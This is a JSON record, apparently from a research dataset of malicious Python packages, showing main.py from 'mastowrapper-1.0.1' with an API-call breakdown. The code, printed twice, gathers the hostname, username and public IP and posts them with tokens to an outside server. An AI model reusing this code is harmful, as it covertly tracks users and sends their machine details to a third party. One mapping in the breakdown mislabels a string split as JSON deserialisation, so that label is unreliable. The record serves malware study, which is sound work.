[
  {
    "pyfile": "main.py",
    "code_snippet": "import os\nimport socket\nimport requests\nimport json\n\nbackend = \"https://backend.verefa.com/\"\nconnect_server = (f\"{backend}gate_auth/\")\n\nclass machine:   \n    def connect(self, tokenid=None, token=None, appname=None):\n        self.token = token\n        self.tokenid = tokenid\n        self.appname = appname\n        try:\n            self.devicename = str(socket.gethostname())\n            self.deviceuser = str(os.getlogin())\n            self.ip = str(requests.get('https://checkip.amazonaws.com').text.strip())\n            compiled = (f\"{self.devicename} |||| {self.deviceuser} |||| {self.ip}\")\n        except:\n            compiled = \"ERROR |||| ERROR |||| ERROR\"\n        if tokenid == None or token == None or appname == None:\n            return \"ARGS NOT SUPPLIED\"\n        try:\n            data = { 'ID': f'{self.tokenid}','TOKEN': f'{self.token}','APPNAME': f'{self.appname}','TRACKERS':f'{compiled}'}\n            connection = requests.post(connect_server, data=json.dumps(data), headers={'Content-Type': 'application/json'}) \n            partition = connection.text.split(\"----\")\n            self.session = partition[0]\n            if partition[1] == \"REQUEST POSITIVE\":\n                return self.session\n            else:\n                return \"CONNECT FAIL\"\n        except:\n            return \"CONNECT FAIL\"",
    "pattern_analysis": {
      "api_sequence": [
        "socket.gethostname",
        "os.getlogin",
        "requests.get",
        "requests.post",
        "json.dumps",
        "requests.post.text.split"
      ],
      "api_sequence_with_args": [
        "socket.gethostname()",
        "os.getlogin()",
        "requests.get('https://checkip.amazonaws.com')",
        "requests.post(connect_server, data=json.dumps(data), headers={'Content-Type': 'application/json'})",
        "json.dumps(data)",
        "requests.post(...).text.split(\"----\")"
      ],
      "mapped_sequence": [
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "requests.post.text.split",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        }
      ],
      "contextual_code": "import os\nimport socket\nimport requests\nimport json\n\nbackend = \"https://backend.verefa.com/\"\nconnect_server = (f\"{backend}gate_auth/\")\n\nclass machine:   \n    def connect(self, tokenid=None, token=None, appname=None):\n        self.token = token\n        self.tokenid = tokenid\n        self.appname = appname\n        try:\n            self.devicename = str(socket.gethostname())\n            self.deviceuser = str(os.getlogin())\n            self.ip = str(requests.get('https://checkip.amazonaws.com').text.strip())\n            compiled = (f\"{self.devicename} |||| {self.deviceuser} |||| {self.ip}\")\n        except:\n            compiled = \"ERROR |||| ERROR |||| ERROR\"\n        if tokenid == None or token == None or appname == None:\n            return \"ARGS NOT SUPPLIED\"\n        try:\n            data = { 'ID': f'{self.tokenid}','TOKEN': f'{self.token}','APPNAME': f'{self.appname}','TRACKERS':f'{compiled}'}\n            connection = requests.post(connect_server, data=json.dumps(data), headers={'Content-Type': 'application/json'}) \n            partition = connection.text.split(\"----\")\n            self.session = partition[0]\n            if partition[1] == \"REQUEST POSITIVE\":\n                return self.session\n            else:\n                return \"CONNECT FAIL\"\n        except:\n            return \"CONNECT FAIL\""
    }
  },
  {
    "metadata": {
      "package_name": "mastowrapper-1.0.1",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/mastowrapper-1.0.1/MastoWrapper-1.0.1/MastoWrapper/main.py",
      "code_hash": "3329baa9cbc157e5dd13f700c01b4421"
    }
  }
]